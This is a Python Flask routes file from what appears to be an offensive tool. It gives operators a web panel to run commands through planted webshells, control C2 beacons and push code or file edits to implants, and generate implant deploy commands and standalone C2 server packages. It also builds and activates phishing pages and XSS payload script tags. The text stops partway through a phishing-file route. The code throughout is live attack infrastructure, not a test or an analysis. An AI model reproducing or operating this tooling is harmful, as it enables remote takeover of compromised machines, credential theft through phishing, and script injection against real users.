"""C2 管理 + WebShell 管理 + 钓鱼页面路由。"""
import json
import os
import time
from datetime import datetime
from typing import Any, Dict

from flask import jsonify, render_template, request, Response

from flowscan import c2_bridge
from flowscan import c2_remote
from flowscan import webshell as ws
from flowscan import phishing_bridge
from flowscan.config import load_yaml

from ._common import _to_bool, login_required


def _c2_config(config: Dict[str, Any]) -> Dict[str, Any]:
    cfg = config.get("c2", {}) or {}
    return {
        "enabled": _to_bool(cfg.get("enabled", False)),
        "project_root": str(cfg.get("project_root", "")),
        "config_file": str(cfg.get("config_file", "config.json")),
    }


def _phishing_config(config: Dict[str, Any]) -> Dict[str, Any]:
    cfg = config.get("phishing", {}) or {}
    return {
        "enabled": _to_bool(cfg.get("enabled", False)),
        "project_root": str(cfg.get("project_root", "phishing_server")),
        "config_file": str(cfg.get("config_file", "config.json")),
    }


def _c2_audit(redis, line: str, output: str = "") -> None:
    """C2 操作审计(Redis list,页面可查)。"""
    try:
        entry = {
            "ts": time.time(),
            "ts_iso": time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime()) + "Z",  # UTC 带 Z,前端 fmtLocal 转本地时区
            "line": str(line or "")[:300],
            "client": c2_bridge.get_current_beacon(),
            "output_head": str(output or "")[:200],
        }
        redis.conn.rpush("fs3:c2:audit", json.dumps(entry, ensure_ascii=False))
        redis.conn.ltrim("fs3:c2:audit", -1000, -1)
    except Exception:
        pass


def _ws_safe(conn: dict) -> dict:
    """连接序列化输出:密码打码(明文只留在服务端,exec/fileop 内部取真实值)。"""
    out = dict(conn)
    out["password"] = "****" if out.get("password") else ""
    return out


def _export_readme(host, server_port, client_port, client_key) -> str:
    """独立 server 部署说明(随导出 zip 附带)。"""
    return f"""# PyExec2 C2 Server — 独立部署说明

本包为导出的 C2 server 独立部署包（含完整代码 + 配置）。

## 启动

    chmod +x start.sh && ./start.sh
    # 或直接:
    python3 server.py --headless

要求: Python 3.10+（纯标准库,无需 pip 安装依赖）。

## 端口

  - {server_port}  implant(beacon) 回连端口
  - {client_port}  client 远程管理端口（本界面远程模式连接此端口）

若端口冲突,编辑 config.json 修改 server_port / client_port 后重启。

## 远程管理（远程模式）

在 FlowScan 的 C2 管理页打开「远程模式」,填写:

  - 远端地址: <本服务器IP>:{client_port}
  - 密钥: {client_key or "<未生成> 本机执行: python3 server.py 后控制台 s_exec keygen,或 web 端导出配置自动生成>"}

## Beacon 密钥

implant_key: {"" or "(见 config.json implant_key)"}
生成 implant 部署命令请在本机 web 端 C2 管理页「部署向导」完成。

## 安全提示

  - client_key / implant_key 等同服务器口令,泄露即失守
  - 建议仅监听内网/经防火墙放行
"""


def _export_start_sh() -> str:
    """独立 server 启动脚本。"""
    return """#!/bin/sh
# PyExec2 C2 Server 独立启动脚本（headless,后台运行）
cd "$(dirname "$0")"
if [ -n "$(command -v nohup)" ]; then
    nohup python3 server.py --headless >> server.log 2>&1 &
    echo "C2 server 已后台启动 (pid $!),日志: server.log"
else
    python3 server.py --headless
fi
"""


def register(app):
    @app.route("/c2")
    @login_required
    def c2_page():
        tab = request.args.get("tab", "c2")
        if tab not in ("c2", "webshell", "phishing", "xss"):
            tab = "c2"
        return render_template("c2.html", tab=tab)

    # ── WebShell 管理 ──

    @app.route("/api/webshell/templates")
    @login_required
    def webshell_templates():
        """模板库模块列表(目录即模块:webshell_templates/*)。"""
        return jsonify({"ok": True, "templates": ws.list_templates()})

    @app.route("/api/webshell/template/render", methods=["POST"])
    @login_required
    def webshell_template_render():
        """渲染指定模板模块:POST {name, params:{pass, cmd_param, ...}}。"""
        data = request.get_json(silent=True) or {}
        name = (data.get("name") or "").strip()
        params = data.get("params") or {}
        if not name:
            return jsonify({"ok": False, "error": "name is required"}), 400
        code = ws.render_template(name, params)
        if code is None:
            return jsonify({"ok": False, "error": f"template not found: {name}"}), 404
        return jsonify({"ok": True, "name": name, "code": code,
                        "note": "执行协议 pass=<密码>&<命令参数名>=<命令>;上传后新建连接填入对应 URL/密码/命令参数名"})

    @app.route("/api/webshell/connections", methods=["GET", "POST"])
    @login_required
    def webshell_connections():
        redis = app.config["get_redis"]()
        if request.method == "POST":
            data = request.get_json(silent=True) or {}
            url = (data.get("url") or "").strip()
            if not url:
                return jsonify({"ok": False, "error": "url is required"}), 400
            conn = ws.create_connection(redis, data)
            return jsonify({"ok": True, "connection": _ws_safe(conn)})
        return jsonify({"ok": True, "connections": [_ws_safe(c) for c in ws.list_connections(redis)]})

    @app.route("/api/webshell/connection/<conn_id>", methods=["GET", "PUT", "DELETE"])
    @login_required
    def webshell_connection(conn_id: str):
        redis = app.config["get_redis"]()
        if request.method == "GET":
            conn = ws.get_connection(redis, conn_id)
            if not conn:
                return jsonify({"ok": False, "error": "connection not found"}), 404
            return jsonify({"ok": True, "connection": _ws_safe(conn)})
        if request.method == "PUT":
            conn = ws.update_connection(redis, conn_id, request.get_json(silent=True) or {})
            if not conn:
                return jsonify({"ok": False, "error": "connection not found"}), 404
            return jsonify({"ok": True, "connection": _ws_safe(conn)})
        return jsonify({"ok": ws.delete_connection(redis, conn_id)})

    @app.route("/api/webshell/connection/<conn_id>/password", methods=["GET"])
    @login_required
    def webshell_password(conn_id: str):
        """明文密码仅在该接口返回(详情接口始终打码),供前端"显示密码"按钮使用。"""
        redis = app.config["get_redis"]()
        conn = ws.get_connection(redis, conn_id)
        if not conn:
            return jsonify({"ok": False, "error": "connection not found"}), 404
        return jsonify({"ok": True, "password": conn.get("password", "")})

    @app.route("/api/webshell/exec", methods=["POST"])
    @login_required
    def webshell_exec():
        redis = app.config["get_redis"]()
        data = request.get_json(silent=True) or {}
        conn_id = str(data.get("conn_id", "") or "")
        command = str(data.get("command", "") or "")
        if not command:
            return jsonify({"ok": False, "error": "command is required"}), 400
        conn = ws.get_connection(redis, conn_id) if conn_id else None
        if not conn:
            return jsonify({"ok": False, "error": "connection not found"}), 404
        try:
            timeout = min(max(1, int(data.get("timeout", 30) or 30)), 300)
        except (TypeError, ValueError):
            timeout = 30
        import time as _t
        _t0 = _t.time()
        output, ok, err = ws.exec_command(conn, command, timeout=timeout)
        ws.push_history(redis, conn_id, "exec", command, output, ok, err,
                        ms=int((_t.time() - _t0) * 1000))
        return jsonify({"ok": True, "output": output, "exec_ok": ok, "error": err})

    @app.route("/api/webshell/history/<conn_id>", methods=["GET", "DELETE"])
    @login_required
    def webshell_history(conn_id: str):
        redis = app.config["get_redis"]()
        if request.method == "DELETE":
            return jsonify({"ok": ws.clear_history(redis, conn_id)})
        limit = request.args.get("limit", "50")
        try:
            limit = min(max(1, int(limit)), 200)
        except (TypeError, ValueError):
            limit = 50
        return jsonify({"ok": True, "history": ws.list_history(redis, conn_id, limit)})

    @app.route("/api/webshell/fileop", methods=["POST"])
    @login_required
    def webshell_fileop():
        redis = app.config["get_redis"]()
        data = request.get_json(silent=True) or {}
        conn_id = str(data.get("conn_id", "") or "")
        conn = ws.get_connection(redis, conn_id) if conn_id else None
        if not conn:
            return jsonify({"ok": False, "error": "connection not found"}), 404
        try:
            timeout = min(max(1, int(data.get("timeout", 30) or 30)), 300)
        except (TypeError, ValueError):
            timeout = 30
        action = str(data.get("action", "") or "")
        path = str(data.get("path", "") or "")
        import time as _t
        _t0 = _t.time()
        output, ok, err = ws.file_op(conn, action, path,
                                     str(data.get("content", "") or ""), str(data.get("target_path", "") or ""),
                                     timeout=timeout)
        ws.push_history(redis, conn_id, "fileop:" + action, f"{action} {path}", output, ok, err,
                        ms=int((_t.time() - _t0) * 1000))
        return jsonify({"ok": True, "output": output, "exec_ok": ok, "error": err})

    # ── C2 管理 ──

    @app.route("/api/c2/status")
    @login_required
    def c2_status():
        config = load_yaml(app.config["CONFIG_PATH"])
        c2cfg = _c2_config(config)
        if not c2cfg["enabled"]:
            return jsonify({"ok": True, "enabled": False, "running": False,
                            "error": "C2 未启用(在 config.yaml 设置 c2.enabled: true 并配 project_root)"})
        # 纯查询:不触发启动(手动停止后保持停止,由前端启动按钮显式拉起)
        running = c2_bridge.c2_running()
        if not running:
            return jsonify({"ok": True, "enabled": True, "running": False,
                            "error": c2_bridge.init_error() or "C2 已停止"})
        return jsonify({"ok": True, "enabled": True, "running": True,
                        "beacon_count": len(c2_bridge.list_beacons())})

    @app.route("/api/c2/start", methods=["POST"])
    @login_required
    def c2_start():
        config = load_yaml(app.config["CONFIG_PATH"])
        c2cfg = _c2_config(config)
        if not c2cfg["enabled"]:
            return jsonify({"ok": False, "error": "C2 未启用"}), 400
        ok, msg = c2_bridge.start_c2(c2cfg["project_root"], c2cfg["config_file"])
        _c2_audit(app.config["get_redis"](), "start c2", msg)
        return jsonify({"ok": ok, "running": ok, "message": msg})

    @app.route("/api/c2/stop", methods=["POST"])
    @login_required
    def c2_stop():
        config = load_yaml(app.config["CONFIG_PATH"])
        c2cfg = _c2_config(config)
        if not c2cfg["enabled"]:
            return jsonify({"ok": False, "error": "C2 未启用"}), 400
        ok, msg = c2_bridge.stop_c2()
        _c2_audit(app.config["get_redis"](), "stop c2", msg)
        return jsonify({"ok": ok, "running": not ok, "message": msg})

    @app.route("/api/c2/beacons")
    @login_required
    def c2_beacons():
        config = load_yaml(app.config["CONFIG_PATH"])
        c2cfg = _c2_config(config)
        if not c2cfg["enabled"]:
            return jsonify({"ok": False, "error": "C2 未启用"}), 400
        c2_bridge.init_c2(c2cfg["project_root"], c2cfg["config_file"])
        beacons = c2_bridge.list_beacons()
        # 合并备注 + 隐藏状态(Redis)
        redis = app.config["get_redis"]()
        hidden = set(redis.conn.zrange("fs3:c2:hidden", 0, -1) or [])
        for b in beacons:
            bid = b.get("client_id", "")
            if bid:
                b["remark"] = redis.conn.get(f"fs3:c2:remark:{bid}") or ""
                b["hidden"] = bid in hidden
        return jsonify({"ok": True, "beacons": beacons})

    @app.route("/api/c2/beacon/<client_id>/hide", methods=["POST"])
    @login_required
    def c2_beacon_hide(client_id: str):
        """隐藏 beacon 到收纳列表(Redis 标记;列表/轮询不再显示,beacon 本身不受影响)。"""
        config = load_yaml(app.config["CONFIG_PATH"])
        c2cfg = _c2_config(config)
        if not c2cfg["enabled"]:
            return jsonify({"ok": False, "error": "C2 未启用"}), 400
        c2_bridge.init_c2(c2cfg["project_root"], c2cfg["config_file"])
        if not c2_bridge.get_beacon(client_id):
            return jsonify({"ok": False, "error": "beacon not found"}), 404
        redis = app.config["get_redis"]()
        redis.conn.zadd("fs3:c2:hidden", {client_id: time.time()})
        _c2_audit(redis, f"hide beacon {client_id}", "ok")
        return jsonify({"ok": True, "hidden": True})

    @app.route("/api/c2/beacon/<client_id>/unhide", methods=["POST"])
    @login_required
    def c2_beacon_unhide(client_id: str):
        """从收纳列表恢复 beacon 到主列表。"""
        config = load_yaml(app.config["CONFIG_PATH"])
        c2cfg = _c2_config(config)
        if not c2cfg["enabled"]:
            return jsonify({"ok": False, "error": "C2 未启用"}), 400
        redis = app.config["get_redis"]()
        redis.conn.zrem("fs3:c2:hidden", client_id)
        _c2_audit(redis, f"unhide beacon {client_id}", "ok")
        return jsonify({"ok": True, "hidden": False})

    @app.route("/api/c2/hidden")
    @login_required
    def c2_hidden():
        """收纳列表:所有已隐藏且未过期的 beacon(含 hidden_at/expired 标记)。"""
        config = load_yaml(app.config["CONFIG_PATH"])
        c2cfg = _c2_config(config)
        if not c2cfg["enabled"]:
            return jsonify({"ok": False, "error": "C2 未启用"}), 400
        c2_bridge.init_c2(c2cfg["project_root"], c2cfg["config_file"])
        redis = app.config["get_redis"]()
        # 过期时限:与清理线程一致(beacon_expire_seconds,默认 1 天)
        try:
            expire = int((c2_bridge.status_detail().get("config") or {}).get("beacon_expire_seconds") or 86400)
        except Exception:
            expire = 86400
        by_id = {b["client_id"]: b for b in c2_bridge.list_beacons()}
        out = []
        for bid, score in redis.conn.zrange("fs3:c2:hidden", 0, -1, withscores=True) or []:
            b = by_id.get(bid)
            if not b:
                continue  # 已被清理线程移除
            b["hidden_at"] = score
            b["expired"] = False
            try:
                last = datetime.fromisoformat(b.get("last_seen", "").replace("Z", "+00:00"))
                b["expired"] = (time.time() - last.timestamp()) > expire
            except Exception:
                pass
            out.append(b)
        out.sort(key=lambda x: float(x.get("hidden_at") or 0), reverse=True)
        return jsonify({"ok": True, "beacons": out, "expire_seconds": expire})

    @app.route("/api/c2/beacon/<client_id>")
    @login_required
    def c2_beacon_detail(client_id: str):
        config = load_yaml(app.config["CONFIG_PATH"])
        c2cfg = _c2_config(config)
        if not c2cfg["enabled"]:
            return jsonify({"ok": False, "error": "C2 未启用"}), 400
        c2_bridge.init_c2(c2cfg["project_root"], c2cfg["config_file"])
        beacon = c2_bridge.get_beacon(client_id)
        if not beacon:
            return jsonify({"ok": False, "error": "beacon not found"}), 404
        return jsonify({"ok": True, "beacon": beacon})

    @app.route("/api/c2/exec", methods=["POST"])
    @login_required
    def c2_exec():
        config = load_yaml(app.config["CONFIG_PATH"])
        c2cfg = _c2_config(config)
        if not c2cfg["enabled"]:
            return jsonify({"ok": False, "error": "C2 未启用"}), 400
        c2_bridge.init_c2(c2cfg["project_root"], c2cfg["config_file"])
        data = request.get_json(silent=True) or {}
        line = str(data.get("line", "") or request.form.get("line", "")).strip()
        if not line:
            return jsonify({"ok": False, "error": "命令为空"}), 400
        out = c2_bridge.execute(line)
        _c2_audit(app.config["get_redis"](), line, out)
        return jsonify({"ok": True, "output": out})

    @app.route("/api/c2/file-edit", methods=["POST"])
    @login_required
    def c2_file_edit():
        """文件编辑弹窗: 读(纯内容) / 写(内容推回, 自动 base64)。"""
        config = load_yaml(app.config["CONFIG_PATH"])
        c2cfg = _c2_config(config)
        if not c2cfg["enabled"]:
            return jsonify({"ok": False, "error": "C2 未启用"}), 400
        c2_bridge.init_c2(c2cfg["project_root"], c2cfg["config_file"])
        data = request.get_json(silent=True) or {}
        action = str(data.get("action", ""))
        bid = str(data.get("beacon_id", "") or "")
        path = str(data.get("path", "") or "")
        if action not in ("read", "write") or not bid or not path:
            return jsonify({"ok": False,
                            "error": "参数不完整(action/beacon_id/path)"}), 400
        if action == "read":
            ok, msg = c2_bridge.exec_module_to_beacon(
                bid, "edit", [path, "", "0"])
            rec = c2_bridge.get_beacon(bid)
            before = len(getattr(rec, "results", None) or []) if rec else 0
            return jsonify({"ok": ok, "message": msg,
                            "before_count": before})
        # write: 内容 base64 后走 edit 模块写模式(整文件替换)
        import base64 as _b64
        content = str(data.get("content", "") or "")
        b64 = _b64.b64encode(content.encode("utf-8")).decode("ascii")
        ok, msg = c2_bridge.exec_module_to_beacon(bid, "edit", [path, b64])
        return jsonify({"ok": ok, "message": msg})

    @app.route("/api/c2/select", methods=["POST"])
    @login_required
    def c2_select():
        """同步前端选中的 beacon 到后端 Dispatcher(等价于终端 use <bid>)。"""
        config = load_yaml(app.config["CONFIG_PATH"])
        c2cfg = _c2_config(config)
        if not c2cfg["enabled"]:
            return jsonify({"ok": False, "error": "C2 未启用"}), 400
        c2_bridge.init_c2(c2cfg["project_root"], c2cfg["config_file"])
        data = request.get_json(silent=True) or {}
        client_id = str(data.get("client_id", "") or "")
        ok, msg = c2_bridge.select_beacon(client_id)
        return jsonify({"ok": ok, "message": msg})

    @app.route("/api/c2/modules")
    @login_required
    def c2_modules():
        config = load_yaml(app.config["CONFIG_PATH"])
        c2cfg = _c2_config(config)
        if not c2cfg["enabled"]:
            return jsonify({"ok": False, "error": "C2 未启用"}), 400
        c2_bridge.init_c2(c2cfg["project_root"], c2cfg["config_file"])
        return jsonify({"ok": True, "implant": c2_bridge.list_modules(), "server": c2_bridge.list_smodules()})

    @app.route("/api/c2/module/<name>")
    @login_required
    def c2_module_detail(name: str):
        config = load_yaml(app.config["CONFIG_PATH"])
        c2cfg = _c2_config(config)
        if not c2cfg["enabled"]:
            return jsonify({"ok": False, "error": "C2 未启用"}), 400
        c2_bridge.init_c2(c2cfg["project_root"], c2cfg["config_file"])
        mod = c2_bridge.get_module(name)
        if not mod:
            return jsonify({"ok": False, "error": "模块不存在"}), 404
        return jsonify({"ok": True, "module": mod})

    @app.route("/api/c2/module/build", methods=["POST"])
    @login_required
    def c2_module_build():
        config = load_yaml(app.config["CONFIG_PATH"])
        c2cfg = _c2_config(config)
        if not c2cfg["enabled"]:
            return jsonify({"ok": False, "error": "C2 未启用"}), 400
        c2_bridge.init_c2(c2cfg["project_root"], c2cfg["config_file"])
        data = request.get_json(silent=True) or {}
        name = str(data.get("name", "") or "")
        args = data.get("args", []) or []
        platform = str(data.get("platform", "") or "")
        ok, out = c2_bridge.build_module_task(name, args, platform)
        if ok:
            return jsonify({"ok": True, "code": out})
        return jsonify({"ok": False, "error": out})

    @app.route("/api/c2/module/add", methods=["POST"])
    @login_required
    def c2_module_add():
        config = load_yaml(app.config["CONFIG_PATH"])
        c2cfg = _c2_config(config)
        if not c2cfg["enabled"]:
            return jsonify({"ok": False, "error": "C2 未启用"}), 400
        c2_bridge.init_c2(c2cfg["project_root"], c2cfg["config_file"])
        data = request.get_json(silent=True) or {}
        ok, msg = c2_bridge.add_module(str(data.get("filename", "") or ""), str(data.get("content", "") or ""))
        return jsonify({"ok": ok, "message": msg})

    @app.route("/api/c2/module/<filename>", methods=["DELETE"])
    @login_required
    def c2_module_delete(filename: str):
        config = load_yaml(app.config["CONFIG_PATH"])
        c2cfg = _c2_config(config)
        if not c2cfg["enabled"]:
            return jsonify({"ok": False, "error": "C2 未启用"}), 400
        c2_bridge.init_c2(c2cfg["project_root"], c2cfg["config_file"])
        ok, msg = c2_bridge.delete_module(filename)
        return jsonify({"ok": ok, "message": msg})

    @app.route("/api/c2/module-files")
    @login_required
    def c2_module_files():
        config = load_yaml(app.config["CONFIG_PATH"])
        c2cfg = _c2_config(config)
        if not c2cfg["enabled"]:
            return jsonify({"ok": False, "error": "C2 未启用"}), 400
        c2_bridge.init_c2(c2cfg["project_root"], c2cfg["config_file"])
        return jsonify({"ok": True, "files": c2_bridge.list_module_files()})

    @app.route("/api/c2/commands")
    @login_required
    def c2_commands():
        config = load_yaml(app.config["CONFIG_PATH"])
        c2cfg = _c2_config(config)
        if not c2cfg["enabled"]:
            return jsonify({"ok": False, "error": "C2 未启用"}), 400
        c2_bridge.init_c2(c2cfg["project_root"], c2cfg["config_file"])
        return jsonify({"ok": True, "commands": c2_bridge.list_commands()})

    @app.route("/api/c2/raw", methods=["POST"])
    @login_required
    def c2_raw():
        config = load_yaml(app.config["CONFIG_PATH"])
        c2cfg = _c2_config(config)
        if not c2cfg["enabled"]:
            return jsonify({"ok": False, "error": "C2 未启用"}), 400
        c2_bridge.init_c2(c2cfg["project_root"], c2cfg["config_file"])
        data = request.get_json(silent=True) or {}
        client_id = str(data.get("client_id", "") or "")
        code = str(data.get("code", "") or "")
        ok, msg = c2_bridge.push_raw(client_id, code)
        return jsonify({"ok": ok, "message": msg})

    @app.route("/api/c2/auto-commands", methods=["GET", "POST"])
    @login_required
    def c2_auto_commands():
        config = load_yaml(app.config["CONFIG_PATH"])
        c2cfg = _c2_config(config)
        if not c2cfg["enabled"]:
            return jsonify({"ok": False, "error": "C2 未启用"}), 400
        c2_bridge.init_c2(c2cfg["project_root"], c2cfg["config_file"])
        if request.method == "GET":
            return jsonify({"ok": True, "auto_commands": c2_bridge.get_auto_commands()})
        data = request.get_json(silent=True) or {}
        commands = data.get("commands")
        if not isinstance(commands, list):
            return jsonify({"ok": False, "error": "commands 必须是列表"}), 400
        ok, msg = c2_bridge.set_auto_commands(commands)
        return jsonify({"ok": ok, "message": msg})

    @app.route("/api/c2/module/exec", methods=["POST"])
    @login_required
    def c2_module_exec():
        config = load_yaml(app.config["CONFIG_PATH"])
        c2cfg = _c2_config(config)
        if not c2cfg["enabled"]:
            return jsonify({"ok": False, "error": "C2 未启用"}), 400
        c2_bridge.init_c2(c2cfg["project_root"], c2cfg["config_file"])
        data = request.get_json(silent=True) or {}
        client_id = str(data.get("client_id", "") or "")
        name = str(data.get("name", "") or "")
        args = data.get("args", []) or []
        if not client_id or not name:
            return jsonify({"ok": False, "error": "client_id/name 为空"}), 400
        ok, msg = c2_bridge.exec_module_to_beacon(client_id, name, args)
        _c2_audit(app.config["get_redis"](), f"module exec {name} -> {client_id}", msg)
        if ok:
            return jsonify({"ok": True, "message": msg})
        return jsonify({"ok": False, "error": msg})

    # ════════════════════ C2 工作台增强 API(2026-08) ════════════════════

    def _ensure_c2():
        """启用检查 + 懒加载,返回 c2cfg 或 None。

        手动停止过(C2 已停止)时不自动拉起,返回 None——由前端启动按钮显式
        /api/c2/start 恢复;其余场景(首次访问等)保持懒加载自动启动。
        """
        config = load_yaml(app.config["CONFIG_PATH"])
        c2cfg = _c2_config(config)
        if not c2cfg["enabled"]:
            return None
        if c2_bridge.c2_running():
            return c2cfg
        if not c2_bridge.was_manual_stopped():
            c2_bridge.init_c2(c2cfg["project_root"], c2cfg["config_file"])
        return c2cfg

    def _beacon_remark_key(bid: str) -> str:
        return f"fs3:c2:remark:{bid}"

    @app.route("/api/c2/status-detail")
    @login_required
    def c2_status_detail():
        if not _ensure_c2():
            return jsonify({"ok": False, "error": "C2 未启用"}), 400
        return jsonify(c2_bridge.status_detail())

    @app.route("/api/c2/keygen", methods=["POST"])
    @login_required
    def c2_keygen():
        if not _ensure_c2():
            return jsonify({"ok": False, "error": "C2 未启用"}), 400
        ok, msg = c2_bridge.generate_client_key()
        _c2_audit(app.config["get_redis"](), "s_exec keygen", msg)
        return jsonify({"ok": ok, "message": msg})

    @app.route("/api/c2/beacon/<client_id>/detail")
    @login_required
    def c2_beacon_detail_full(client_id: str):
        if not _ensure_c2():
            return jsonify({"ok": False, "error": "C2 未启用"}), 400
        data = c2_bridge.beacon_detail(client_id)
        if not data.get("ok"):
            return jsonify(data), 404
        redis = app.config["get_redis"]()
        bid = data["beacon"].get("client_id", client_id)
        remark = redis.conn.get(_beacon_remark_key(bid))
        data["beacon"]["remark"] = remark or ""
        return jsonify(data)

    @app.route("/api/c2/beacon/<client_id>/tasks")
    @login_required
    def c2_beacon_tasks(client_id: str):
        if not _ensure_c2():
            return jsonify({"ok": False, "error": "C2 未启用"}), 400
        return jsonify({"ok": True, "tasks": c2_bridge.task_list(client_id)})

    @app.route("/api/c2/task/update", methods=["POST"])
    @login_required
    def c2_task_update():
        if not _ensure_c2():
            return jsonify({"ok": False, "error": "C2 未启用"}), 400
        data = request.get_json(silent=True) or {}
        client_id = str(data.get("client_id", ""))
        task_id = str(data.get("task_id", ""))
        code = str(data.get("code", ""))
        if not client_id or not task_id:
            return jsonify({"ok": False, "error": "client_id/task_id 必填"}), 400
        return jsonify(c2_bridge.task_update(client_id, task_id, code=code))

    @app.route("/api/c2/task/delete", methods=["POST"])
    @login_required
    def c2_task_delete():
        if not _ensure_c2():
            return jsonify({"ok": False, "error": "C2 未启用"}), 400
        data = request.get_json(silent=True) or {}
        client_id = str(data.get("client_id", ""))
        task_id = str(data.get("task_id", ""))
        if not client_id or not task_id:
            return jsonify({"ok": False, "error": "client_id/task_id 必填"}), 400
        return jsonify(c2_bridge.task_delete(client_id, task_id))

    @app.route("/api/c2/beacon/<client_id>/remark", methods=["GET", "POST"])
    @login_required
    def c2_beacon_remark(client_id: str):
        if not _ensure_c2():
            return jsonify({"ok": False, "error": "C2 未启用"}), 400
        redis = app.config["get_redis"]()
        key = _beacon_remark_key(client_id)
        if request.method == "GET":
            return jsonify({"ok": True, "remark": redis.conn.get(key) or ""})
        data = request.get_json(silent=True) or {}
        remark = str(data.get("remark", "") or "").strip()[:500]
        if remark:
            redis.conn.set(key, remark)
        else:
            redis.conn.delete(key)
        return jsonify({"ok": True, "remark": remark})

    @app.route("/api/c2/audit")
    @login_required
    def c2_audit():
        redis = app.config["get_redis"]()
        limit = min(int(request.args.get("limit", "100") or 100), 500)
        raw = redis.conn.lrange("fs3:c2:audit", 0, limit - 1)
        entries = []
        for x in raw:
            try:
                entries.append(json.loads(x))
            except Exception:
                continue
        return jsonify({"ok": True, "count": len(entries), "audit": entries})

    @app.route("/api/c2/build-deploy", methods=["POST"])
    @login_required
    def c2_build_deploy():
        if not _ensure_c2():
            return jsonify({"ok": False, "error": "C2 未启用"}), 400
        data = request.get_json(silent=True) or {}
        host = str(data.get("host", "") or "").strip()
        try:
            port = int(data.get("port", 0) or 0)
            interval = int(data.get("interval", 60) or 60)
            jitter = float(data.get("jitter", 0.2) or 0.2)
        except (TypeError, ValueError):
            return jsonify({"ok": False, "error": "端口/间隔/抖动需为数字"}), 400
        if not host or port <= 0:
            return jsonify({"ok": False, "error": "host/port 必填"}), 400
        res = c2_bridge.build_deploy(host, port, interval, jitter)
        if not res.get("ok"):
            return jsonify({"ok": False, "error": res.get("error", "生成失败")}), 400
        _c2_audit(app.config["get_redis"](), f"build deploy {host}:{port}", "ok")
        return jsonify(res)

    @app.route("/api/c2/export-events")
    @login_required
    def c2_export_events():
        if not _ensure_c2():
            return jsonify({"ok": False, "error": "C2 未启用"}), 400
        client_id = request.args.get("bid", "").strip()
        events = c2_bridge.export_events(client_id)
        text = "\n".join(json.dumps(e, ensure_ascii=False) for e in events)
        filename = f"c2_events_{client_id or 'all'}_{time.strftime('%Y%m%d_%H%M%S')}.jsonl"
        return Response(text, mimetype="application/x-ndjson; charset=utf-8",
                        headers={"Content-Disposition": f"attachment; filename={filename}"})

    @app.route("/api/c2/listener-config", methods=["POST"])
    @login_required
    def c2_listener_config():
        if not _ensure_c2():
            return jsonify({"ok": False, "error": "C2 未启用"}), 400
        data = request.get_json(silent=True) or {}
        ok, msg = c2_bridge.update_listener_config(data)
        _c2_audit(app.config["get_redis"](), f"listener-config {json.dumps(data)[:200]}", msg)
        return jsonify({"ok": ok, "message": msg})

    @app.route("/api/c2/restart", methods=["POST"])
    @login_required
    def c2_restart():
        if not _ensure_c2():
            return jsonify({"ok": False, "error": "C2 未启用"}), 400
        ok, msg = c2_bridge.restart_c2()
        _c2_audit(app.config["get_redis"](), "restart c2", msg)
        return jsonify({"ok": ok, "message": msg})

    # ════════════════════ 钓鱼页面 API(2026-08) ════════════════════

    def _ph_audit(redis, line: str, output: str = "") -> None:
        """钓鱼页面操作审计(独立 list,与 C2 审计分开)。"""
        try:
            entry = {
                "ts": time.time(),
                "ts_iso": time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime()) + "Z",  # UTC 带 Z,前端 fmtLocal 转本地时区
                "line": str(line or "")[:300],
                "output_head": str(output or "")[:200],
            }
            redis.conn.rpush("fs3:phishing:audit", json.dumps(entry, ensure_ascii=False))
            redis.conn.ltrim("fs3:phishing:audit", -1000, -1)
        except Exception:
            pass

    def _ensure_phishing():
        """启用检查 + 懒加载 + 回传挂载,返回 ph_cfg 或 None。"""
        config = load_yaml(app.config["CONFIG_PATH"])
        ph_cfg = _phishing_config(config)
        if not ph_cfg["enabled"]:
            return None
        srv = phishing_bridge.init_from_flowscan_config()
        if srv is None:
            return None
        phishing_bridge.attach_report_callback(app.config["get_redis"]())
        return ph_cfg

    @app.route("/api/phishing/status")
    @login_required
    def phishing_status():
        if not _ensure_phishing():
            return jsonify({"ok": False, "enabled": False,
                            "error": "钓鱼页面未启用(config.yaml 设置 phishing.enabled: true)"})
        return jsonify(phishing_bridge.status())

    @app.route("/api/phishing/modules")
    @login_required
    def phishing_modules():
        if not _ensure_phishing():
            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
        return jsonify({"ok": True, "modules": phishing_bridge.list_modules()})

    @app.route("/api/phishing/module/<name>")
    @login_required
    def phishing_module_detail(name: str):
        if not _ensure_phishing():
            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
        mod = phishing_bridge.get_module(name)
        if not mod:
            return jsonify({"ok": False, "error": "模块不存在"}), 404
        return jsonify({"ok": True, "module": mod})

    @app.route("/api/phishing/build", methods=["POST"])
    @login_required
    def phishing_build():
        if not _ensure_phishing():
            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
        data = request.get_json(silent=True) or {}
        name = str(data.get("name", "") or "").strip()
        args = data.get("args") or {}
        host = str(data.get("host", "") or "").strip()
        port = data.get("port")
        if not isinstance(args, dict):
            args = {}
        res = phishing_bridge.build_payload(name, args, host=host, port=port)
        if not res.get("ok"):
            return jsonify({"ok": False, "error": res.get("error", "构建失败")}), 400
        # xss_payload 模块额外返回注入代码:script tag 直接加载目标反连模块(args.module)
        tag_res = None
        if name == "xss_payload":
            target = str(args.get("module") or "").strip() or "xss_payload"
            tag_args = dict(args)
            tag_args.pop("module", None)
            tag_res = phishing_bridge.build_script_tag(target, tag_args, host=host, port=port)
        return jsonify({"ok": True, "code": res["code"], "script_tag": (tag_res or {}).get("tag", "")})

    @app.route("/api/phishing/pages")
    @login_required
    def phishing_pages():
        if not _ensure_phishing():
            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
        pages = phishing_bridge.list_pages()
        active = phishing_bridge.status().get("active_page", "")
        return jsonify({"ok": True, "pages": pages, "active_page": active})

    @app.route("/api/phishing/page/<name>/activate", methods=["POST"])
    @login_required
    def phishing_page_activate(name: str):
        if not _ensure_phishing():
            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
        ok, msg = phishing_bridge.set_active_page(name)
        _ph_audit(app.config["get_redis"](), f"page activate {name}", msg)
        return jsonify({"ok": ok, "message": msg})

    @app.route("/api/phishing/page/<name>/files")
    @login_required
    def phishing_page_files(name: str):
        if not _ensure_phishing():
            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
        return jsonify({"ok": True, "files": phishing_bridge.list_page_files(name)})

    @app.route("/api/phishing/page/<name>/file", methods=["GET", "POST", "DELETE"])
    @login_required
    def phishing_page_file(name: str):
        if not _ensure_phishing():
            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
        if request.method == "DELETE":
